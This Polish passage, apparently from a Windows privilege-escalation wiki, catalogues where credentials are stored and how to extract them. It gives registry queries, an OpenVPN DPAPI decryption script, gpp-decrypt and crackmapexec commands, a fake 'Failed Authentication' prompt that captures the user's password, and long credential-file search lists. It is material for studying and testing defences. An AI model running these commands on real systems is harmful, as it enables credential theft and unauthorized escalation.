Serwer CI może zachowywać przesłane zmiany w kodzie źródłowym w swoim katalogu danych nawet po zakończeniu kompilacji. [TeamCity opisuje](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html) `system/changes` jako miejsce przechowywania zmian zdalnych uruchomień; katalog danych można skonfigurować i nie musi znajdować się w `ProgramData`. Czytelna poprawka może zachować usunięte lub dodane odwołania do pliku z danymi uwierzytelniającymi, klucza szyfrującego albo skryptu używającego obu tych elementów. Na przykład przepływ pracy PowerShell z `ConvertTo-SecureString -Key` wymaga zarówno klucza AES, jak i zaszyfrowanego ciągu; [Microsoft dokumentuje](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring), że klucz jest przekazywany oddzielnie. Najpierw sprawdzaj wyłącznie nazwy dostępnych poprawek, a następnie, mając odpowiednie uprawnienia, analizuj istotną zawartość bez wyświetlania sekretów w wynikach rutynowej enumeracji. Sama ścieżka do poprawki, zaszyfrowana wartość ani odwołanie do klucza nie dowodzą, że dane uwierzytelniające są prawidłowe ani że zapewniają dostęp z wyższymi uprawnieniami. Ogranicz uprawnienia ACL katalogu danych i nie umieszczaj sekretów w zmianach w kodzie kompilacji.

### Niestandardowa rotacja haseł lokalnego administratora

Samodzielnie napisany rotator haseł może przechowywać zaszyfrowane hasło lokalnego administratora w usłudze lokalnej, a dane uwierzytelniające do magazynu danych w czytelnym pliku `.env` lub obok pliku binarnego aktualizatora. Analizuj razem zadanie zaplanowane aktualizatora, konto, uprawnienia ACL konfiguracji, nasłuchujący interfejs oraz uprawnienia do magazynu danych. Magazyn danych dostępny wyłącznie przez loopback nadal jest osiągalny dla użytkownika lokalnego, który ma prawidłowe dane uwierzytelniające, ale samo uwierzytelnienie nie dowodzi uprawnień do odczytu odpowiednich rekordów. Jeśli ziarno szyfrowania lub materiał klucza są dostępne obok tekstu zaszyfrowanego, przed uznaniem szyfrowania za wiarygodne sprawdź dokładny sposób wyprowadzania klucza. Schemat deterministycznie wyprowadzający klucz AES z ujawnionego ziarna przy użyciu Go [`math/rand`](https://pkg.go.dev/math/rand) nie nadaje się do ochrony tego hasła; dokumentacja Go wskazuje, że ten pakiet nie jest odpowiedni do generowania liczb losowych w zastosowaniach wymagających bezpieczeństwa. Zanim uznasz odzyskane hasło za ścieżkę eskalacji uprawnień, potwierdź, że jest aktualne i należy do konta z lokalnej grupy Administrators. Samo zadanie zaplanowane, ścieżka do `.env` ani zaszyfrowany blob nie potwierdzają żadnego z tych warunków. Nie umieszczaj haseł ani materiału klucza w wynikach rutynowej enumeracji.

Do zarządzania hasłami lokalnych administratorów używaj [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview). Przechowywanie w katalogu lub Entra i związane z nim mechanizmy kontroli dostępu różnią się od niestandardowego lokalnego magazynu danych; podobnie [role Elasticsearch](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/) decydują o tym, czy uwierzytelniony użytkownik magazynu danych może odczytać określony indeks.

### Archiwa wtyczek serwera Java i ponowne użycie danych uwierzytelniających

Niektóre wtyczki serwerów Java są dystrybuowane jako archiwa JAR w katalogu `plugins` serwera. Czytelna, niestandardowa wtyczka może zawierać konfigurację lub bytecode z osadzonymi danymi uwierzytelniającymi usługi. Analizuj archiwum wyłącznie z odpowiednimi uprawnieniami i nie umieszczaj odzyskanych sekretów w wynikach rutynowej enumeracji. Sama ścieżka do wtyczki nie dowodzi, że istnieje sekret, a odzyskane hasło usługi prowadzi do wyższych uprawnień tylko wtedy, gdy jest również prawidłowe dla konta z wyższymi uprawnieniami. Sprawdź odpowiednie uprawnienia ACL plików i zastąp ponownie używane dane uwierzytelniające odrębnymi sekretami. Zobacz [przewodnik PaperMC dotyczący instalacji wtyczek](https://docs.papermc.io/paper/adding-plugins/) z opisem układu katalogów oraz [dokumentację JAR firmy Oracle](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html) z opisem zawartości archiwów.

### Dane uwierzytelniające wbudowanej bazy danych Openfire

Instalacja Openfire korzystająca z wbudowanej bazy danych może przechowywać `openfire.script` w `Openfire\embedded-db`. Jeśli bieżące konto może go odczytać, sprawdź razem rekordy `OFUSER` i właściwość `passwordKey`. [Dokumentacja dostawcy Openfire dotycząca dostawcy użytkowników](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html) informuje, że hasła mogą być przechowywane w postaci zwykłego tekstu lub szyfrowane kluczem przechowywanym w tej właściwości. Odzyskane hasło ma znaczenie dla eskalacji tylko wtedy, gdy nadal jest prawidłowe dla tożsamości z wyższymi uprawnieniami; sama nazwa pliku nie dowodzi ani dostępu do odczytu, ani ponownego użycia danych uwierzytelniających. Ścieżka jest wskazówką inwentaryzacyjną, dlatego nie umieszczaj zawartości bazy danych ani danych uwierzytelniających w wynikach rutynowej enumeracji.

Oddzielny plik `Openfire\conf\openfire.xml` może ujawnić skonfigurowane porty i interfejs powiązania konsoli administracyjnej, nawet gdy używana jest zewnętrzna baza danych. Openfire często wiąże konsolę administracyjną z loopback; lokalne konto nadal może połączyć się z tym adresem, jeśli nasłuchujący proces działa. Sprawdź razem faktyczny nasłuchujący proces, autoryzowaną rolę administratora, zasady przesyłania wtyczek i tożsamość usługi Openfire. Administrator, który może zainstalować wtyczkę, może uruchomić jej kod w kontekście usługi, co może oznaczać wysokie uprawnienia, gdy usługa działa jako LocalSystem. Zgodne hasło konta ani czytelna ścieżka do konfiguracji same w sobie nie dowodzą dostępu do konsoli administracyjnej ani możliwości wykonania kodu. Zobacz [przewodnik dostawcy dotyczący instalacji i zarządzania wtyczkami](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) oraz [właściwość API przesyłania wtyczek](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html).

### Konfiguracja serwera do zarządzania śledczego

Konfiguracje serwera Velociraptor, zwykle nazwane `server.config.yaml`, mogą zawierać `CA.private_key` wewnętrznego CA. Jeśli użytkownik o niższych uprawnieniach może odczytać ten klucz, może być w stanie utworzyć certyfikat klienta API. To, czy zapewni to wyższe uprawnienia, zależy od ról użytkowników serwera, dostępności API oraz tożsamości, w kontekście której działa serwer lub agent docelowy. Konfiguracja klienta zawiera inne dane; jej znalezienie nie dowodzi dostępu do CA serwera. W niektórych wdrożeniach prywatny klucz CA jest przechowywany offline, więc czytelna konfiguracja serwera może go nie zawierać.

Na serwerze Windows sprawdź uprawnienia ACL **konfiguracji serwera** w jego katalogu instalacyjnym oraz wszelkich chronionych kopii zapasowych. Jedna z możliwych lokalizacji to `%ProgramFiles%\VelociraptorServer\server.config.yaml`; jeśli skonfigurowana ścieżka usługi jest inna, użyj jej. Potwierdź, że bieżąca tożsamość może odczytać plik i że `CA.private_key` faktycznie się w nim znajduje. Nie wyświetlaj klucza prywatnego w logach ani wynikach enumeracji. Procedura dostawcy `config api_client` używa klucza CA do wystawienia certyfikatu klienta, ale potrzebna jest również skuteczna rola po stronie serwera; jej utworzenie lub zmiana może wymagać dostępu do zapisu w magazynie danych albo ponownego uruchomienia. Istniejąca uprzywilejowana tożsamość serwera może zapewnić ścieżkę dostępu nawet wtedy, gdy zapis jest niedostępny. Zapytania API z uprawnieniami do wykonywania działają w odpowiednim kontekście serwera lub agenta, który może mieć wysokie uprawnienia.

Chroń konfigurację serwera i kopie zapasowe za pomocą restrykcyjnych uprawnień ACL, przechowuj klucz podpisujący CA offline, jeśli to możliwe, oraz ogranicz role API i dostęp do nasłuchujących interfejsów. Zobacz [dokumentację API Velociraptor](https://docs.velociraptor.app/docs/server_automation/server_api/) oraz [wskazówki dotyczące konfiguracji zabezpieczeń](https://docs.velociraptor.app/docs/deployment/security/).

### Dane uwierzytelniające PuTTY

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTY jest osobnym menedżerem sesji. Jego natywny zaszyfrowany magazyn może znajdować się w `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat`, a wyeksportowana kopia zapasowa sesji może mieć nazwę `sessions-backup.dat` i być przechowywana w innym miejscu. [Przewodnik eksportu SolarWinds](https://thwack.solarwinds.com/discussion/comment/115591) informuje, że eksporty są szyfrowane hasłem i mogą zawierać sesje, klucze, skrypty, tagi oraz powiązania; [forum pomocy technicznej](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) wskazuje natywny magazyn. Najpierw sprawdź uprawnienia do plików i ścieżki. Znalezienie któregokolwiek z tych plików nie ujawnia hasła ani nie dowodzi, że zapisane poświadczenia są nadal ważne lub zapewniają wyższe uprawnienia.

### Klucze hostów SSH PuTTY

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### Klucze SSH w rejestrze

Klucze prywatne SSH mogą być przechowywane w kluczu rejestru `HKCU\Software\OpenSSH\Agent\Keys`, więc sprawdź, czy znajduje się tam coś interesującego:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

Jeśli znajdziesz jakikolwiek wpis w tej ścieżce, prawdopodobnie będzie to zapisany klucz SSH. Jest zaszyfrowany, ale można go łatwo odszyfrować za pomocą [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Więcej informacji o tej technice znajdziesz tutaj: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

Jeśli usługa `ssh-agent` nie jest uruchomiona i chcesz, aby uruchamiała się automatycznie podczas rozruchu, wykonaj:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> Wygląda na to, że ta technika nie jest już aktualna. Spróbowałem utworzyć klucze SSH, dodać je za pomocą `ssh-add` i zalogować się przez SSH na maszynę. Rejestr HKCU\Software\OpenSSH\Agent\Keys nie istnieje, a procmon nie wykrył użycia `dpapi.dll` podczas uwierzytelniania kluczem asymetrycznym.

### Pliki instalacji nienadzorowanej

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

Możesz również wyszukać te pliki za pomocą **metasploit**: _post/windows/gather/enum_unattend_

Przykładowa zawartość:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### Kopie zapasowe SAM i SYSTEM

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

Czytelne pliki kopii zapasowej Windows Imaging (`.wim`) mogą również zawierać offline’owe hive’y `SAM`, `SECURITY` i `SYSTEM`. W pierwszej kolejności sprawdź lokalnie dostępne katalogi kopii zapasowych lub obrazów i przed wyodrębnieniem czegokolwiek sprawdź **nazwy elementów** obrazu; sama nazwa pliku `.wim` nie dowodzi, że zawiera on hive’y, a standardowe obrazy `install.wim`, `boot.wim` i obrazy odzyskiwania często okazują się fałszywymi tropami. Udział SMB to odrębna ścieżka dostępu i należy go sprawdzać tylko wtedy, gdy jest objęty zakresem. Zobacz wskazówki Microsoft dotyczące [Windows image guidance](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) oraz [registry hive file reference](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives).

### Poświadczenia w chmurze

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

Wyszukaj plik o nazwie **SiteList.xml**

### Cached GPP Password

Wcześniej dostępna była funkcja umożliwiająca wdrażanie niestandardowych lokalnych kont administratora na grupie komputerów za pośrednictwem Group Policy Preferences (GPP). Metoda ta miała jednak poważne luki w zabezpieczeniach. Po pierwsze, obiekty Group Policy (GPO), przechowywane jako pliki XML w SYSVOL, były dostępne dla każdego użytkownika domeny. Po drugie, hasła w tych GPP, zaszyfrowane za pomocą AES256 z użyciem publicznie udokumentowanego klucza domyślnego, mogły zostać odszyfrowane przez każdego uwierzytelnionego użytkownika. Stanowiło to poważne zagrożenie, ponieważ mogło umożliwić użytkownikom uzyskanie podwyższonych uprawnień.

Aby ograniczyć to ryzyko, opracowano funkcję skanującą lokalnie buforowane pliki GPP w poszukiwaniu niepustego pola „cpassword”. Po znalezieniu takiego pliku funkcja odszyfrowuje hasło i zwraca niestandardowy obiekt PowerShell. Obiekt ten zawiera szczegóły dotyczące GPP i lokalizacji pliku, co ułatwia identyfikację tej luki w zabezpieczeniach i jej usunięcie.

Wyszukaj te pliki w `C:\ProgramData\Microsoft\Group Policy\history` lub w _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (przed Windows Vista)_:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Aby odszyfrować cPassword:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

Używanie crackmapexec do uzyskania haseł:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### IIS Web Config

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

Przykład pliku web.config z poświadczeniami:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### Archiwa kopii zapasowych w katalogu głównym witryny IIS

Stara kopia ZIP umieszczona bezpośrednio w katalogu głównym witryny udostępnianym przez serwer może ujawnić wcześniejsze pliki konfiguracyjne i dane uwierzytelniające, których można ponownie użyć. Sprawdź skonfigurowaną fizyczną ścieżkę witryny i to, czy archiwum jest faktycznie dostępne przez HTTP, zanim uznasz je za ujawnione. Domyślna ścieżka `C:\inetpub\wwwroot` to tylko jedna z możliwości. Szybka lokalna inwentaryzacja może wyświetlić nazwy i rozmiary plików bez otwierania archiwów:

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

Nazwa archiwum nie potwierdza, że zawiera ono sekret ani że odzyskane dane uwierzytelniające zapewniają wyższe uprawnienia.

### Dane uwierzytelniające OpenVPN

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### Dzienniki

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### Poproś o dane uwierzytelniające

Zawsze możesz **poprosić użytkownika o podanie jego danych uwierzytelniających, a nawet danych innego użytkownika**, jeśli sądzisz, że może je znać (pamiętaj, że bezpośrednie **proszenie** klienta o **dane uwierzytelniające** jest naprawdę **ryzykowne**):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **Możliwe nazwy plików zawierających dane uwierzytelniające**

Znane pliki, które kiedyś zawierały **hasła** zapisane **jawnym tekstem** lub w **Base64**

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

#### Wariant listy nazw plików bez rozszerzenia Password Safe

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Bazy danych Password Safe v3 często używają rozszerzenia `.psafe3`. Traktuj plik o pasującej nazwie jako potencjalny zaszyfrowany sejf; sama jego obecność nie oznacza, że możesz go odczytać, odblokować ani użyć zapisanych w nim danych uwierzytelniających. Sprawdź dostępne profile użytkowników i skonfigurowane katalogi główne udziałów plików, aby ustalić, gdzie przechowywane są takie pliki.

Czytelny plik KeePass `.kdbx` również jest tylko wskazówką do zaszyfrowanego sejfu. Do jego odblokowania potrzebne jest właściwe hasło główne oraz wszelkie skonfigurowane dodatkowe czynniki, takie jak plik klucza lub konto. Jeśli podczas autoryzowanego audytu w jednym z wpisów znajdziesz parę hashy LM:NT, zweryfikuj nazwę konta oraz to, czy hash NT jest aktualny i akceptowany przez usługę NTLM celu, zanim rozważysz [pass-the-hash](../ntlm/README.md#pass-the-hash). Wpis w sejfie sam w sobie nie zapewnia uprawnień Administratora ani SYSTEM; dostęp do zdalnej usługi, uprawnienia konta i ewentualny osobny etap uruchomienia usługi również muszą być spełnione. Inwentaryzacja powinna podawać ścieżkę do sejfu i informację o możliwości jego odczytu, a nie wyświetlać bazy danych ani zapisanych danych uwierzytelniających.

Przeszukaj wszystkie wskazane pliki:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

#### Wariant polecenia wyszukiwania bez rozszerzenia Password Safe

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### Poświadczenia w Koszu

Sprawdź też Kosz pod kątem zapisanych w nim poświadczeń.

Sprawdź dostępne wpisy Kosza w poszukiwaniu usuniętych kopii zapasowych i archiwów konfiguracji, a także plików, których nazwy wyraźnie wskazują na poświadczenia. Przydatna kopia zapasowa `.7z`, `.zip` lub `.rar` może mieć kilka miesięcy i zwyczajną nazwę. Windows przechowuje pierwotną ścieżkę i czas usunięcia w rekordzie `$I`, a usunięty plik jako powiązany z nim wpis `$R`; przed otwarciem archiwum sprawdź metadane i uprawnienia bieżącej tożsamości do odczytu. Widoczność zależy od woluminu, identyfikatora SID użytkownika i uprawnień do plików, więc pusta lista nie dowodzi, że nie istnieje żadna kopia zapasowa, którą da się odzyskać. Traktuj nazwę archiwum jako kandydata do sprawdzenia, a nie dowód, że zawiera prawidłowy sekret.

Dostępny usunięty plik `.pfx` może również być tropem związanym z **podpisywaniem kodu**. Jeśli zawiera dostępny klucz prywatny, można go użyć do podpisania zmodyfikowanego skryptu PowerShell; [PowerShell wymaga certyfikatu do podpisywania kodu z kluczem prywatnym](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature), a [reguły wydawcy AppLocker sprawdzają tożsamość podpisującego i zakres reguły](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker). Wykonanie skryptu na koncie innego użytkownika wymaga, aby bieżąca tożsamość mogła zmodyfikować konkretny skrypt, obowiązująca reguła akceptowała wynikowy podpis dla tego skryptu i konta docelowego, a zaplanowane zadanie lub inny proces o wyższych uprawnieniach faktycznie go uruchamiał. Sama nazwa pliku `.pfx`, temat certyfikatu ani możliwość zapisu do skryptu nie potwierdzają istnienia całego łańcucha. Przed otwarciem materiału zawierającego klucz prywatny lub uruchomieniem zadania sprawdź metadane, listy ACL, zasady i polecenie zaplanowane do wykonania.

Sprawdź również dostępne bazy danych profili klientów komunikatorów, notatki i otrzymane pliki pod kątem tropów dotyczących poświadczeń. Eksport klucza odzyskiwania BitLocker może być zapisany jako HTML lub TXT, czasem w archiwum kopii zapasowej o opisowej nazwie. Taki materiał może umożliwić dostęp do osobnego, zaszyfrowanego woluminu danych zawierającego starsze kopie zapasowe; sprawdzaj wolumin i archiwum tylko wtedy, gdy masz na to upoważnienie. Jeśli kopia zapasowa zawiera `NTDS.dit`, odzyskanie poświadczeń domenowych w trybie offline wymaga również pasującego pliku hive `SYSTEM`, jak opisano w [procedurze dotyczącej kopii zapasowych i grup uprzywilejowanych](../active-directory-methodology/privileged-groups-and-token-privileges.md). Same nazwy plików i zablokowany wolumin nie dowodzą, że istnieje użyteczny klucz odzyskiwania ani kopia zapasowa domeny.

Do **odzyskiwania haseł** zapisanych przez różne programy możesz użyć: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### W rejestrze

**Inne możliwe klucze rejestru zawierające poświadczenia**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**Wyodrępnianie kluczy openssh z rejestru.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Historia przeglądania

Sprawdź bazy danych, w których przechowywane są hasła z **Chrome lub Firefox**.\
Sprawdź bazy danych, w których przechowywane są hasła z **Chrome, Edge lub Firefox**.\
Sprawdź też historię, zakładki i ulubione w przeglądarkach — być może znajdują się tam **hasła**.

W przypadku standardowego profilu Edge **Default** bieżącego użytkownika plik `Login Data` znajduje się w `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default`, a plik `Local State` w nadrzędnym katalogu `User Data`. [Microsoft dokumentuje domyślną lokalizację profilu](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars); inny profil lub zasada `UserDataDir` może ją zmienić. Sama obecność plików wskazuje jedynie możliwy magazyn poświadczeń: sprawdź, czy pliki są dostępne do odczytu, czy masz właściwy dla danego użytkownika kontekst DPAPI lub inny autoryzowany materiał kluczowy oraz czy zapisany login należy do konta o wyższych uprawnieniach. Samo wyliczenie ścieżek nie wymaga otwierania bazy danych ani wyświetlania odszyfrowanych haseł.

W przypadku Firefoksa [Mozilla dokumentuje](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile), że pliki `key4.db` i `logins.json` w profilu tworzą parę: klucz i zaszyfrowane loginy. Ich obecność wskazuje jedynie możliwe źródło: sprawdź, czy oba pliki są dostępne do odczytu, czy istnieją zapisane wpisy oraz czy klucz jest chroniony hasłem głównym, zanim uznasz poświadczenia za możliwe do użycia. Jeśli odzyskane poświadczenie należy do konta domenowego, osobno sprawdź efektywne uprawnienia tego konta do zarządzania grupami oraz uprawnienia grupy do [odczytu lub odszyfrowywania haseł LAPS](../active-directory-methodology/laps.md); same artefakty przeglądarki nie potwierdzają możliwości uzyskania uprawnień administratora.

Narzędzia do wyodrębniania haseł z przeglądarek:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

